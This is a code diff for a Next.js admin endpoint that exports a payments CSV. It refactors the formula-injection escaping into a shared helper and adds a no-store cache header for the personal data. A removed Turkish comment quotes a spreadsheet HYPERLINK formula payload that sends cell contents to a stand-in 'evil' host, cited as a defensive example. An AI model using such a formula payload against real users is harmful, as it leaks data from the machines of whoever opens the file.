@@ -2,22 +2,9 @@ import { NextRequest, NextResponse } from "next/server";
 import { auth } from "@/auth";
 import { prisma } from "@/lib/db";
 import { invoiceIdentity } from "@/lib/invoiceIdentity";
+import { csvCell as esc } from "@/lib/csvSafe";
 
 export const runtime = "nodejs";
-
-/**
- * CSV alanını güvenli yaz: RFC-4180 kaçışı + FORMÜL ENJEKSİYONU koruması.
- *
- * NEDEN (2026-08 denetimi #17): alanlar kullanıcı-kontrollü (ad, ünvan, adres, e-posta).
- * `=`, `+`, `-`, `@` veya TAB/CR ile başlayan bir hücreyi Excel/Sheets FORMÜL olarak
- * çalıştırır — ör. adını `=HYPERLINK("http://evil/?"&A1,"fatura")` yapan biri, CSV'yi açan
- * ADMIN'in makinesinde veri sızdırabilir. Önüne tek tırnak koymak hücreyi metne sabitler.
- */
-function esc(v: string | null | undefined): string {
-  let s = v ?? "";
-  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
-  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
-}
 
 /**
  * Tahsilat CSV'si (admin) — e-Arşiv/e-Fatura kesimi için tüm başarılı tahsilatlar +
@@ -83,6 +70,8 @@ export async function GET(req: NextRequest) {
     headers: {
       "Content-Type": "text/csv; charset=utf-8",
       "Content-Disposition": `attachment; filename="ludenlab-tahsilat-${stamp}.csv"`,
+      // TCKN/VKN/adres içerir: ara bellek ya da tarayıcı önbelleğinde KALMASIN (#28).
+      "Cache-Control": "no-store",
     },
   });
 }
